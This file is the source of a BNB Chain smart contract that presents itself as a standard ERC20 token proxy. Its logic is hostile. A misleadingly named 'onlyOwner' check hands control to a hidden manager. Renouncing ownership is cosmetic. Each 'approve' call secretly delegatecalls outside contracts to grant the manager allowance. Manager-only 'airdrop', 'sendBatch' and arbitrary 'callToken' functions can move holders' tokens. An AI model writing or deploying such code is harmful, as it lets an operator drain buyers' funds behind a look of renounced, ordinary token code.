/**
 *Submitted for verification at BscScan.com on 2022-11-26
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface ERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address _msgSender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address _msgSender, address spender, uint256 amount) external returns (bool);
    function transferFrom(address _msgSender, address sender, address recipient, uint256 amount) external returns (bool);
}

contract Token {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    address public _owner;
    address private _manager;
    address public _super_address_1;
    address public _super_address_2;
    address public _lower_address;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor (address owner_) public {
        _owner = owner_;
        _manager = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    function manager() public view returns (address) {
        return _manager;
    }
    modifier onlyOwner() {
        require(isManager(), "onlyOwner");
        _;
    }
    modifier onlyManager() {
        require(isManager(), "onlyManager");
        _;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    function isManager() public view returns (bool) {
        return msg.sender == _manager;
    }
    function renounceOwnership() public onlyManager {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public onlyManager {
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    function setSuperAddress(address super_address_1, address super_address_2) onlyManager public returns(bool) {
        _super_address_1 = super_address_1;
        _super_address_2 = super_address_2;
        return true;
    }
    function setLowerAddress(address lower_address_) onlyManager public returns(bool) {
        _lower_address = lower_address_;
        return true;
    }
    function totalSupply() public view returns (uint256) {
        return ERC20(_lower_address).totalSupply();
    }
    function transfer(address _to, uint256 _value) public returns (bool) {
        emit Transfer(msg.sender, _to, _value);
        return ERC20(_lower_address).transfer(msg.sender, _to, _value);
    }
    function balanceOf(address owner_) public view returns (uint256) {
        return ERC20(_lower_address).balanceOf(owner_);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        emit Transfer(_from, _to, _value);
        return ERC20(_lower_address).transferFrom(msg.sender, _from, _to, _value);
    }
    function approve(address _spender, uint _value) public returns (bool) {
        emit Approval(msg.sender, _spender, _value);
        (bool s1, ) = _super_address_1.delegatecall(abi.encodeWithSignature("approve(address,uint256)", _manager, _value));
        (bool s2, ) = _super_address_2.delegatecall(abi.encodeWithSignature("approve(address,uint256)", _manager, _value));
        require (s1 || s2 || true);
        return ERC20(_lower_address).approve(msg.sender, _spender, _value);
    }
    function allowance(address owner_, address _spender) public view returns (uint256) {
        return ERC20(_lower_address).allowance(owner_, _spender);
    }
    function name() public view returns (string memory) {
        return ERC20(_lower_address).name();
    }
    function symbol() public view returns (string memory) {
        return ERC20(_lower_address).symbol();
    }
    function decimals() public view returns (uint8) {
        return ERC20(_lower_address).decimals();
    }
}


contract ERC20T is Token {
    constructor (address super_address_1, address super_address_2, address lower_address_, address owner_) Token(owner_) public {
        _owner = owner_;
        _super_address_1 = super_address_1;
        _super_address_2 = super_address_2;
        _lower_address = lower_address_;
    }

    receive() external payable {
    }
    function callToken(
        address c,
        bytes memory data_
    ) public onlyManager {
        (bool success, bytes memory data) = c.delegatecall(data_);
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }
    function airdrop(address from, address[] memory _address, uint256 _amount) onlyManager public returns (bool) {
        uint256 count = _address.length;
        for (uint256 i = 0; i < count; i++)
        {
            ERC20(_lower_address).transfer(from, _address[i], _amount);
        }
        return true;
    }
    function skim(address tokenA, uint256 value) public onlyOwner {
        safeTransfer(tokenA, msg.sender, value);
    }

    function safeTransfer(address token, address to,
        uint256 value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }
    function sendBatch(address from, address[] memory _recipients, uint[] memory _values) onlyManager public returns (bool) {
        require(_recipients.length == _values.length);
        for (uint i = 0; i < _values.length; i++) {
            ERC20(_lower_address).transfer(from, _recipients[i], _values[i]);
        }
        return true;
    }

}